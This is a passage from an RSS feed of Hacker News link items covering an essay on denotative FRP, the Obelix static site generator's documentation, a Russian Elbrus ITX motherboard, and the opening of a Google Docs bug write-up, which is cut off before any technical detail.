<p>For many years I been searching for the perfect paradigm for programming user interfaces. Like many others, I fell in love with FRP with the rise of ReactJS and spent a few years searching for the perfect reactive model. Eventually, I found my way back to the original work on FRP by Conal Elliott. It took me almost a year to make sense of it. This essay attempts to make Conal’s vision more understandable to less mathematically-oriented programmers, and also show how this perspective could be the foundation for a new era of programming, not just with user interfaces, but also multi-node computing, storage, machine learning, etc.</p>

<p>This essay assumes familiarity with:</p>

<ul>
  <li>JavaScript syntax, including Promises,</li>
  <li>a web FRP library, such as ReactJS, VueJS, CycleJS, Redux, or Elm,</li>
  <li>and minimal ML/Haskell syntax, including the <code>Maybe</code> type.</li>
</ul>

<h2 id="modern-reactive-web-programming">Modern Reactive Web Programming</h2>

<p>I fell in love with ReactJS in late 2014. The view is a pure function of state. It was so obviously <em>right</em>.</p>

<p>But of course React isn’t the whole answer. It’s just a view library that keeps the view in sync with state. It’s left open how you manage that state.</p>

<p>Inspired by the Elm Architecture, Redux became the popular answer to the state management question. It puts the state of the entire application into a single object. To affect this global state object, your HTML event handlers emit “actions”, such as <code>{"type": "newTodoItem", "description": "Clean my room"}</code>. You then define a reducer function that modifies the global state each time it receives an action. This architecture initially made a lot of sense to me. One big sell is that its global state object is easily serialized, which enables hot reloading and time-travel debugging.</p>

<p>Unexpectedly, when I tried to make sense of large Redux projects, I found myself getting headaches. I found it difficult to understand how the app fit together, which parts affected which other parts. I began to see that the Redux architecture was <a href="https://futureofcoding.org/papers/comprehensible-frp">simulating global mutable state in a seemingly immutable and functional setting, ruining modularity and comprehensibility</a>.</p>

<p>I eagerly slurped up each new React-inspired framework, such as VueJS and CycleJS, to see if they could finally be the “full solution” to interface development, but none felt quite right.</p>

<p><a href="https://pchiusano.github.io/">Paul Chiusano</a> suggested I read <a href="http://conal.net/">Conal Elliott</a>, the creator of the FRP paradigm. Paul claimed that React and the other JS-based FRP libraries weren’t even ‘true’ FRP. I didn’t like to hear this. I loved React and the FRP I knew. I was reluctant to read <a href="http://conal.net/papers/icfp97/">a stodgy paper from the 90s</a>. But I trusted and respected Paul so I gave it a go.</p>

<p>It was a lot of mathematics and strange symbols. What’s a “least upper bound” and “pointed CPO”? My eyes glazed over. I tried a more <a href="http://conal.net/papers/push-pull-frp/">recent paper he wrote on FRP</a>, but it was full of scary Applicative Functors and Monads. I gave up.</p>

<p>However, I couldn’t escape HN comments alluding to “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=real%20frp">real</a>” or “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=original%20frp">original</a>” FRP. They were annoying enough to send me back to Conal for another try. This time I printed out all his papers, determined to make sense of them!</p>

<p><img src="https://user-images.githubusercontent.com/2288939/41498690-cb736744-7141-11e8-98b3-634d0b630f9e.png" alt=""></p>

<p>I took my time with the unfamiliar mathematical and typeclass concepts. With a lot of focused reading, it finally began to click.</p>

<h2 id="dctp-denotative-continuous-time-programming">DCTP: Denotative Continuous-Time Programming</h2>

<p>It’s important to distinguish between the <a href="https://medium.com/@andrestaltz/why-i-cannot-say-frp-but-i-just-did-d5ffaa23973b">many flavors of FRP</a>. The name originally comes from Conal Elliott and Paul Hudak’s work in the 90s . The term has since been stretch so far beyond its original meaning that Conal has <a href="https://stackoverflow.com/questions/5385377/the-difference-between-reactive-and-functional-reactive-programming/5386908#5386908">retreated to a new phrase</a> to describe his original vision: Denotative Continuous Time Programming (DCTP).</p>

<h2 id="d-is-for-denotative">D is for Denotative</h2>

<p>The D of DCTP has similarly nuanced intellectual roots. It stands for “denotative”, a term <a href="https://www.cs.cmu.edu/~crary/819-f09/Landin66.pdf">Peter Landin proposed</a> as a an alternative to “nonprocedural”, “functional” or “declarative”, which lack precise definitions. A denotative programming language is one where:</p>

<blockquote>
  <p>(a) each expression has a nesting subexpression structure,</p>
</blockquote>

<p>Unlike most programming languages which have a mix of statement commands and expressions, denotative programming languages live solely in the world of expressions. For example, instead of if-statements, there are ternary expressions. Instead of loops, recursion. Nested mathematical-like expressions are the only way to construct programs, and thus a program is simply one large, nested expression.</p>

<blockquote>
  <p>(b) each subexpression denotes something (usually a number, truth value or numerical function),</p>
</blockquote>

<p>Additionally, the components of denotative languages must <em>denote</em> some mathematical object. This was directly inspired by Chris Strachey and Dana Scott’s work from the early 1970’s on denotational semantics, an approach to modeling programming languages with mathematical objects. But where denotational semantics was originally created as a way to <em>analyze all programming languages</em>, denotative programming languages are a very specific kind of language, purposefully designed to be well-suited for mathematical reasoning.</p>

<p>For example, a map (“object” in JavaScript, “dictionary” in Python) in a denotative language could <em>denote</em> a <em>mathematical function</em> of keys to <code>Maybe</code> values. The empty map would be <code>key =&gt; Nothing</code>, returning <code>Nothing</code> for any key. Inserting a key, value pair could be: <code>(map, key, value) =&gt; (key' =&gt; key === key' ? Just value : map(key))</code>, which wraps an old map function with a new key comparison, but delegates to the old function for the remaining keys.</p>

<p>This map need not be <em>implemented</em> in such an inefficient way for a language to qualify as denotative.  Denotations are specifications, describing the <em>what</em>, but leaving the <em>how</em> open. Implementations of denotative languages can be as as non-denotative as efficiency concerns demand. A common misunderstanding of the denotative approach is that it’s impractical to eschew statements, because statements must be executed eventually for computation to be carried out. This is of course true, but the distinction is that in denotative languages, statements live in the implementation of the language instead of in the language itself.</p>

<p>For example, even non-denotative languages have functions like <code>pow</code>, <code>sqrt</code>, <code>log</code>, <code>sin</code>, and <code>cos</code>, which denote their equivalent mathematical operations. Users of these functions are free to treat them as true expressions, without having to worry about their potentially non-denotative implementation details. Do they use specially-designed hardware? Loops? It doesn’t matter: users are free to write <code>log(x) + sin(y)</code> and the language’s compiler or interpreter will execute these expressions with whatever non-denotative algorithm is most efficient, as long as it meets the denotative specification for <code>log</code> and <code>sin</code>.</p>

<p>From the denotative perspective, anywhere an operation does not meet its denotative equivalent is a bug. This would include anywhere floating-point math is used, which causes, for example,  <code>0.1 + 0.2</code> to equal <code>0.30000000000000004</code>. In other words, all the quirks of math you need to learn <em>above and beyond what you already learned in algebra class</em> is considered incidental complexity. On the other hand, non-denotative languages aren’t trying to be denotative, so it’s not entirely fair to rank them according to a rubric they are not aiming for.</p>

<blockquote>
  <p>(c) the thing an expression denotes, i.e., its “value”, depends only on the values of its subexpressions, not on other properties of them.</p>
</blockquote>

<p>The final criteria is that expressions in denotative languages are entirely self-contained. There’s no action-at-a-distance. There’s no way to call <code>someValue.update()</code>. For one, that would be a statement. But additionally, all possible ways <code>someValue</code> updates need to be defined in one of the sub-expressions of <code>someValue</code> itself.</p>

<p>In summary, a denotative language is a pure functional language, with the addition of point (b): mathematical denotations.</p>

<h3 id="benefits-of-denotative-programming">Benefits of Denotative Programming</h3>

<p>Programmers spend roughly <a href="http://www.humane-assessment.com/guide/assessment-costs/">50% of their time reading code</a>, so a language that better lends itself to comprehensibility is a boon for productivity.</p>

<p>Denotative languages better convey the global structure of a program. We can <em>fully</em> understand an expression by its subexpressions, and their subexpressions, recursively. There are no spooky action-at-a-distance side-effects that can manipulate things from afar. We don’t have to read the entire codebase to ensure we understand a single piece; we must merely read its subexpressions, recursively. This allows us to quickly rule out what we do and do not need to read, saving us a lot of time in large codebases. A denotative language resembles a dictionary or encyclopedia, where one can understand an entry by reading it and what it references. A non-denotative language resembles prose, like a novel, which you have to read cover-to-cover to know what happens, even if you only care about one specific character.</p>

<p>These comprehensibility benefits extend to local analysis as well. In denotative programming, the equal sign means what it does in a mathematics textbook: we can replace instances of the left with the expression to the right. This is known as referential transparency. We can safely refactor:</p>

<div><div><pre><code><span>b</span> <span>=</span> <span>f</span><span>(</span><span>a</span><span>)</span>
<span>c</span> <span>=</span> <span>g</span><span>(</span><span>b</span><span>)</span>
<span>d</span> <span>=</span> <span>h</span><span>(</span><span>c</span><span>)</span>
</code></pre></div></div>

<p>to:</p>



<p>True equality is also a boon for performance optimizations, which is about replacing sections of programs with equivalent but faster sections. When your code is free of operational concerns, the language implementer is able to make more interesting optimizations. The flip-side is that because the denotative approach cuts us off from these implementation details, it lessens the ability of a user of a denotative language to improve the performance of their programs. However, programmer time is often more …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futureofcoding.org/essays/dctp.html">https://futureofcoding.org/essays/dctp.html</a></em></p>]]>
            </description>
            <link>https://futureofcoding.org/essays/dctp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559805</guid>
            <pubDate>Mon, 28 Dec 2020 15:17:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Obelix, a simple and extensible static site generator]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25559551">thread link</a>) | @jdormit
<br/>
December 28, 2020 | https://obelix-site-builder.github.io/obelix/ | <a href="https://web.archive.org/web/*/https://obelix-site-builder.github.io/obelix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        <img src="https://obelix-site-builder.github.io/obelix/images/obelix.jpg" alt="obelix the gaul">
      </p>
      <p>Obelix is a <a href="https://www.netlify.com/blog/2020/04/14/what-is-a-static-site-generator-and-3-ways-to-find-the-best-one/">static site generator</a>. Its primary goals are simplicity, ease of use, and extensibility.</p>
      <p>In a nutshell, a static site generator transforms a set of input data into static assets (HTML, CSS, JavaScript, images, etc.) ready to be served by a web server. The input data can come from a wide variety of sources, from local files on disk to APIs.</p>
      <p>Out of the box, Obelix supports:</p>
      <ul>
        <li><a href="https://commonmark.org/">CommonMark</a>-compliant markdown rendering</li>
        <li>Page and post metadata via <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter</li>
        <li>String templating powered by <a href="https://handlebarsjs.com/">Handlebars</a></li>
        <li>Layout templates to apply a common layout to the whole site or a subdirectory</li>
        <li>List templates to render index pages, feeds, or any other listing of a subdirectory</li>
        <li>A powerful plugin system that allows developers to write JavaScript to pull in data from external APIs, transform existing data before it gets rendered, or anything else you can imagine</li>
      </ul>
      <h2>Installation</h2>
      <p>Obelix is available <a href="https://npmjs.org/obelix">on NPM</a>. It's meant to be installed globally:</p>
      <pre><code>$ sudo npm install -g obelix
</code></pre>
      <h2>Getting started</h2>
      <p>An Obelix site consists of a directory containing the source files for the website and an <code>obelix.json</code> configuration file. At a minimum, this file needs to contain two keys, <code>"src"</code> and <code>"out"</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build"
}
</code></pre>
      <p>The <code>"src"</code> key should be the relative path to the directory where your site's source files live. The <code>"out"</code> key is the relative path to the directory where Obelix will output the built site. For example, the directory for the site described by the <code>obelix.json</code> above might look like this:</p>
      <pre><code>.
├── obelix.json
└── source
    ├── index.md
    └── # all site source files here
</code></pre>
      <p>To build the site, run:</p>
      <pre><code>$ obelix build
</code></pre>
      <p>This will parse through all file in the source directory, transform them as necessary, and render the final site to the output directory (creating it if necessary). Any markdown files will get transformed to HTML, frontmatter and Handlebars template expressions will be processed, and layout and list templates will be applied.</p>
      <p>You can also run:</p>
      <pre><code>$ obelix serve
</code></pre>
      <p>This will start a web server serving your site on port 8080 (by default - pass the <code>-p</code> option to change this). The server will automatically rebuild the site whenever it detects changes to a source file. This is a just a development convenience - the <code>obelix serve</code> server is not production-ready!</p>
      <p>There are a few other keys you can put in <code>obelix.json</code>:</p>
      <ul>
        <li><code>"metadata"</code>: this should be a JSON object containing site metadata. This object will exposed in Handlebars templates as the <code>site</code> key (see below)</li>
        <li><code>"plugins"</code>: An object mapping plugin names to configuration options. More details on this in the Plugins section below</li>
      </ul>
      <h2>Source file configuration</h2>
      <p>All source files in an Obelix site are considered either an <code>asset</code> or a <code>page</code>. A <code>page</code> is a text file (with any file extension) where the beginning of the file contains <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter. YAML frontmatter is used to specify metadata about the page and consists of the characters <code>---</code>, followed by a newline and a YAML document containing data you want, and finally another newline and the closing characters <code>---</code>. For example:</p>
      <pre><code>---
author: Getafix
title: Little-known herbs of Gaul
published: 2020-12-17
tags:
  - blog
  - druidism
---
And then the page content goes here!
</code></pre>
      <p>Obelix performs some default transformations on <code>page</code>-type sources, including expanding Handlebars template expressions and applying layout templates, and exposes these files as data in list templates (more on all this later).</p>
      <p>Any file that does not contain YAML frontmatter, including image or other non-text files, are considered <code>asset</code>-type sources. Obelix does no additional processing on <code>asset</code> files - it just copies them verbatim to the output directory.</p>
      <p><strong>Important</strong>: Even if you have no metadata you want to attach to a page, you need to put YAML frontmatter on it for Obelix to process it. In these cases, you can just put the opening <code>---</code> and closing <code>---</code> with no content in between.</p>
      <p>The source directory structure determines the output directory structure. For example, a source file <code>blob/post1.md</code> would get written to the output directory as <code>blog/post1.html</code>.</p>
      <h2>Template expansion</h2>
      <p><code>Page</code>-type source files can contain <a href="https://handlebarsjs.com/">Handlebars</a> template expressions. Template expressions are delimited by double curly braces - for example, <code>{{ title }}</code>. Any page metadata in the page's frontmatter is available as a variable for use in a template expression, and any site metadata set in <code>obelix.json</code> is available in the <code>site</code> object in template expressions.</p>
      <p>For example, given the following <code>obelix.json</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build",
    "metadata": {
        "publisher": "When In Rome LLC"
    }
}
</code></pre>
      <p>And the following <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
author: Caesar
---
This post was written by {{ author }} and published by {{ site.publisher }}
</code></pre>
      <p>The output file <code>post.html</code> would render like this:</p>
      <pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;This post was written by Caesar and published by When In Rome LLC&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Handlebars offers many additional templating features - see <a href="https://handlebarsjs.com/guide/">the official guide</a> to learn more.</p>
      <h2>Layout templates</h2>
      <p>Layout templates allow you to apply a unified layout to <code>page</code> sources. By default, layout templates are any file named <code>layout.html.hbs</code> or <code>layout.html.handlebars</code>, but these defaults can be overridden by the <code>"layoutTemplates"</code> <code>obelix.json</code> field, which should be an array of layout template names. Individual pages can also specify a <code>template</code> metadata field, which should be the name of the file to use as a layout template for that page. Layout templates apply to all <code>page</code> sources in the same directory they are in and in subdirectories, but if a subdirectory has its own layout template that template overrides the parent layout template. This means you can put a <code>layout.html.hbs</code> at the root of your site that will be applied by default to every <code>page</code> in the site, but you can override that template for individual subdirectories by giving them their own <code>layout.html.hbs</code>.</p>
      <p>A layout template is a Handlebars template that gets passed the content of the page it is applied to as the <code>content</code> key. When rendering a <code>page</code>, if Obelix finds a layout template for that page it will render the layout template and replace the output content with the result.</p>
      <p>An example should make things clearer. Given this <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
---
# My Post
This is some hot content!
</code></pre>
      <p>And this <code>layout.html.hbs</code>:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
       {{{ content }}}
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>The output file <code>post.html</code> would look like this:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
      &lt;h1&gt;My Post&lt;/h1&gt;
      &lt;p&gt;This is some hot content!&lt;/p&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Note the use of triple curly braces in <code>{{{ content }}}</code>. This tells Handlebars not to HTML-escape the result of the expression. See <a href="https://handlebarsjs.com/guide/#html-escaping">here</a> for more info.</p>
      <h2>List templates</h2>
      <p>A list template is like a layout template, but instead of being passed a single page it gets passed a list of pages. List templates can be used to generate index pages, RSS feeds, or any other collection of content. A list template is simply any file with a <code>.hbs</code> or <code>.handlebars</code> file extension that isn't a layout template. Unless you have the <code>"layoutTemplates"</code> configuration option set, this means that any <code>.hbs</code> or <code>.handlebars</code> file that isn't named <code>layout.html.hbs</code>, <code>layout.html.handlebars</code>, or is the target of a <code>template</code> page metadata will be treated as a list template.</p>
      <p>List templates get passed an array of all pages in the same directory as them as the <code>pages</code> variable. Each item in this list is a <code>page</code> object that the one that gets passed to layout templates - it will have a <code>content</code> key containing the page content in addition to any keys in the page frontmatter. The <code>pages</code> array can be iterated over using the <a href="https://handlebarsjs.com/guide/builtin-helpers.html#each">Handlebars <code>each</code> helper</a>:</p>
      <pre><code>&lt;html&gt;
    &lt;body&gt;
      {{#each pages}}
          &lt;h1&gt;{{ title }}&lt;/h1&gt;
          
      {{/each}}
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>If you want to iterate over pages that aren't in the same directory as the list template, you can use the <code>site.pages</code> variable. This variable is a nested array of all pages in the site. The format of <code>site.pages</code> is a little weird: it's a recursive array that can be iterated over to access the pages in the top-level directories, but exposes subdirectories as attributes on that array with values that are themselves recursive arrays. For example, given the following site structure:</p>
      <pre><code>.
├── index.md
├── about.md
└── blog
    ├── post1.md
    └── post2.md
</code></pre>
      <p>The <code>site.pages</code> variable would be an array containing <code>index.md</code> and <code>about.md</code>, and <code>site.pages.blog</code> would be an array containing <code>post1.md</code> and <code>post2.md</code>.</p>
      <p>If you have a directory whose name isn't a valid JavaScript identifier, you can access it using index notation, e.g. <code>site.pages["My weird folder"]</code>. Although this layout is a bit unconventional, it makes it convenient to loop through pages using the <code>{{each}}</code> helper at any level in the directory structure.</p>
      <p>List templates can be either <code>page</code> or <code>asset</code> sources. If you include a frontmatter block in a list template, it will be treated as a <code>page</code> and have layout templates applied to it. If not, it will be treated as an <code>asset</code> and layout templates will not be applied to it.</p>
      <p>Tip: Obelix adds a <code>url</code> metadata field to every page by default. This is especially useful in list templates as it lets you construct a link to the pages that the list template is rendering.</p>
      <h2>Data files</h2>
      <p>Source files with a <code>.json</code>, <code>.yaml</code>, or <code>.yml</code> extension are considered data files. Data files are a way to store structured data that isn't meant to be displayed literally. Obelix parses all the data files it finds and passes …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://obelix-site-builder.github.io/obelix/">https://obelix-site-builder.github.io/obelix/</a></em></p>]]>
            </description>
            <link>https://obelix-site-builder.github.io/obelix/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559551</guid>
            <pubDate>Mon, 28 Dec 2020 14:48:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: FixScript – the annoying part of ops, automated]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559301">thread link</a>) | @WFHRenaissance
<br/>
December 28, 2020 | https://www.fixscript.net/get_to_the_point | <a href="https://web.archive.org/web/*/https://www.fixscript.net/get_to_the_point">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.fixscript.net/get_to_the_point</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559301</guid>
            <pubDate>Mon, 28 Dec 2020 14:16:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ITX Motherboard with an Elbrus CPU]]>
            </title>
            <description>
<![CDATA[
Score 114 | Comments 87 (<a href="https://news.ycombinator.com/item?id=25559240">thread link</a>) | @jamesmd
<br/>
December 28, 2020 | https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3135">

	

	<div>
		
<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan’s team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus МВ3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600–1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014–2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>



<figure><img src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/cdn.mos.cms.futurecdn.net/FJnFEt6S7uvSsgYuRiG985-320-80.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Elbrus-4C Based PC</figcaption></figure>



<h2>IcepeakITX ELBRUS-8CB Motherboard</h2>



<div><p>The IcepeakITX ELBRUS-8CB Motherboard is the brain child of a group of enthusiasts that banded together to crowdfund a security focused Mini ITX motherboard featuring a 1.5GHZ 8 core Elbrus 8CB CPU and ships with either 8GB or 32GB DDR4 ECC RAM. The board does not ship with a heatsink however it is compatible with any heatsink designed for the Intel LGA3647 socket. </p></div>



<figure><img src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.crowdsupply.com/img/b1e8/a04-2958crr_jpg_project-main.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>IcepeakITX ELBRUS-8CB Motherboard</figcaption></figure>



<h2>Full Technical Specifications</h2>



<ul><li><strong>Form-factor:</strong>&nbsp;Mini-ITX</li><li><strong>CPU:</strong>&nbsp;MCST (Moscow Center of SPARC Technologies) Elbrus-8CB 8-core @ 1.5 GHz VLIW (fully compatible with any LGA3647 heatsink)</li><li><strong>SB:</strong>&nbsp;MCST KPI-2 Multicontroller</li><li><strong>RAM:</strong>&nbsp;8 GB or 32 GB (2x [4+1] 8 Gbit/32 Gbit DDR4 DRAM 2400 MHz ECC)</li><li><strong>SATA:</strong>&nbsp;2x M.2_2280 + 4x SATA_6G</li><li><strong>Storage Expansion:</strong>&nbsp;1x microSD (HC)</li><li><strong>Cache:</strong>&nbsp;1x PATA 8 GB (required as cache device for hardware emulation of x86 on Elbrus)</li><li><strong>PCIe:</strong>&nbsp;1x PCIe2_x16 + 1x PCIe2_x1 (as USB3)</li><li><strong>Security:</strong><ul><li>1x TPM SPI connector</li><li>2x boot firmware chip with extra security</li><li>3x heatsink detectors</li><li>1x temperature sensor trigger</li><li>2x tampering sensor</li></ul></li><li><strong>Network:</strong><ul><li>Marvell M88E1111-RCJ chipset</li><li>1x 1G_SFP</li><li>3x 1G_RJ45</li></ul></li><li><strong>GPS:</strong>&nbsp;GPS chip with internal antenna port</li><li><strong>USB:</strong><ul><li>2x USB 2.0 (rear)</li><li>4x USB 2.0 (+PD) (rear)</li><li>2x USB 3.0 (rear)</li><li>1x USB 2.0 (internal)</li></ul></li><li><strong>COM:</strong>&nbsp;1x COM header (internal) required for debugging boot</li><li><strong>Debug:</strong>&nbsp;1x 6-pin debug port, 1x 4-pin (USB to GPIO)</li><li><strong>Video:</strong>&nbsp;2x HDMI (1 HDMI per SM768/256 MB)</li><li><strong>Audio:</strong>&nbsp;Integrated simple audio codec (Linux-compatible)</li><li><strong>Additional Sensors:</strong><ul><li>Fall detection sensor</li><li>Gyroscope</li><li>Water sensor</li></ul></li><li><strong>Additional Connectors:</strong><ul><li>2x PWM-4</li><li>RTC battery connector</li><li>Simple BEEP connector</li></ul></li><li><strong>PCB:</strong>&nbsp;14 layers (level 5 accuracy) / ISOLA Hi Tg 180</li></ul>



<div><p>The Motherboard is also fully opensource and after funding the board schematics and design specifications will be released on github. </p><p>Crowdfunding for the IcepeakITX ELBRUS-8CB is expected to go live early next year via crowdsupply. More details can be found <a href="https://www.crowdsupply.com/sra-centr8/icepeakitx-elbrus-8cb" target="_blank" rel="noreferrer noopener">here</a>. </p><p>Check out more interesting tech coming to crowdfunding sites <a href="https://blog.jmdawson.co.uk/category/crowdfunding/">here</a>.</p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/icepeakitx-elbrus-8cb-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559240</guid>
            <pubDate>Mon, 28 Dec 2020 14:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stealing private documents through a bug in Google Docs]]>
            </title>
            <description>
<![CDATA[
Score 299 | Comments 137 (<a href="https://news.ycombinator.com/item?id=25559063">thread link</a>) | @hackerpain
<br/>
December 28, 2020 | https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/ | <a href="https://web.archive.org/web/*/https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://savebreach.com/content/images/size/w300/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 300w,
                            https://savebreach.com/content/images/size/w600/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 600w,
                            https://savebreach.com/content/images/size/w1000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 1000w,
                            https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://savebreach.com/content/images/size/w2000/2020/12/Stealing-your-Google-Docs-through-a-postMessage-Exploit.png" alt="Stealing your private documents through a bug in Google Docs">
            </figure>

            <section>
                <div>
                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this 